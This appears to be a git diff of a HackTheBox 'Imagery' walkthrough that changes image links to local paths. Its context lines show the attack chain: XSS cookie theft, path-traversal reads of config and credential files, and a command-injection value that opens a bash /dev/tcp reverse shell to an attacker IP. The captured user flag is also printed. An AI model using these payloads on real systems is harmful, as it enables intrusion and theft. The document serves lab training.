@@ -5,6 +5,8 @@ Operating System: Linux
 Machine IP: 10.10.11.88
 ```
 
+> **Note:** To view images in this walkthrough, copy all PNG files from the main branch root to the `images/` directory, or run: `./copy-images-from-main.sh`
+
 ## Initial Enumeration
 Running nmap scan on the target shows the following results:
 ```
@@ -27,7 +29,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We can see port 22 (SSH) and port 8000 running a Flask web application (Werkzeug httpd) serving an "Image Gallery".
 
-![nmap](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/nmap.png)
+![nmap](images/nmap.png)
 
 Since SSH won't help us initially, let's focus on the web application on port 8000.
 
@@ -44,7 +46,7 @@ Let's enumerate directories using dirsearch:
 401    32B   http://10.10.11.88:8000/uploads/dump.sql
 ```
 
-![dirsearch](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/dirseach.png)
+![dirsearch](images/dirseach.png)
 
 We found several interesting endpoints including login, register, and protected directories.
 
@@ -58,7 +60,7 @@ Running nuclei to detect known vulnerabilities:
 [email-extractor] [http] [info] http://10.10.11.88:8000 ["support@imagery.com"]
 ```
 
-![nuclei](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/nuclei.png)
+![nuclei](images/nuclei.png)
 
 Nuclei detected **CVE-2023-37582**, a critical XSS vulnerability in the application.
 
@@ -66,7 +68,7 @@ Nuclei detected **CVE-2023-37582**, a critical XSS vulnerability in the applicat
 
 The application is vulnerable to XSS (CVE-2023-37582). We can exploit this to steal admin session cookies.
 
-![poc](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/poc.png)
+![poc](images/poc.png)
 
 First, we create a simple PHP receiver to capture cookies:
 ```php
@@ -82,7 +84,7 @@ Start a Python HTTP server to host the receiver:
 python -m http.server 9999
 ```
 
-![php_receiver](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/php_receiver.png)
+![php_receiver](images/php_receiver.png)
 
 After triggering the XSS, we successfully capture the admin session cookie:
 ```
@@ -93,11 +95,11 @@ After triggering the XSS, we successfully capture the admin session cookie:
 
 With the captured session cookie, we can access the admin panel. We need to use Burp Suite to intercept and modify our requests with the stolen cookie.
 
-![burp](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/burp.png)
+![burp](images/burp.png)
 
 Once authenticated as admin, we discover a log viewer feature that's vulnerable to path traversal.
 
-![burp2](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/burp2.png)
+![burp2](images/burp2.png)
 
 ### Exploiting Path Traversal / LFI
 
@@ -108,14 +110,14 @@ GET /admin/get_system_log?log_identifier=../../../../../home/web/web/config.py
 
 This allows us to read arbitrary files on the system!
 
-![burp3](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/burp3.png)
+![burp3](images/burp3.png)
 
 Let's read the database file to extract credentials:
 ```http
 GET /admin/get_system_log?log_identifier=../../../../../home/web/web/db.json
 ```
 
-![db_results](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/db_results.png)
+![db_results](images/db_results.png)
 
 We extract the following user credentials:
 ```json
@@ -137,9 +139,9 @@ Also found password hash: `iambatman`
 
 Let's login with the discovered credentials:
 
-![login](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/login.png)
+![login](images/login.png)
 
-![testuserpass](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/testuserpass.png)
+![testuserpass](images/testuserpass.png)
 
 Success! We're now logged in as a regular user.
 
@@ -152,14 +154,14 @@ Upload any image, then intercept the crop request with Burp Suite and inject a r
 ";bash -c '/bin/bash -i 5<> /dev/tcp/10.10.14.120/4444 0<&5 1>&5 2>&5' ;"
 ```
 
-![rev_shell](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/rev_shell.png)
+![rev_shell](images/rev_shell.png)
 
 Set up a netcat listener on your attacking machine:
 ```bash
 nc -lvnp 4444
 ```
 
-![pwn](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/pwn.png)
+![pwn](images/pwn.png)
 
 We got a shell! Now let's stabilize it:
 ```bash
@@ -176,7 +178,7 @@ Navigate to the user directory and capture the flag:
 cat /home/*/user.txt
 ```
 
-![user_flag](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/user_flag.png)
+![user_flag](images/user_flag.png)
 
 **User Flag:** `5d9c1d507a3f76af1e5c97a3ad1eaa31`
 
@@ -209,7 +211,7 @@ Run charcoal with the `-R` flag to disable password requirements:
 sudo charcoal -R
 ```
 
-![markpass](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/markpass.png)
+![markpass](images/markpass.png)
 
 Found hash: `01c3d2e5bdaf6134cec0a367cf53e535` for user `supersmash`
 
@@ -228,7 +230,7 @@ Wait up to 1 minute for the cronjob to execute, then:
 cat /tmp/pwned.txt
 ```
 
-![gettingRootFlag](https://raw.githubusercontent.com/aabbb-test/HackTheBox-Machines-/main/gettingRootFlag.png)
+![gettingRootFlag](images/gettingRootFlag.png)
 
 **Root Flag:** Successfully obtained!
 
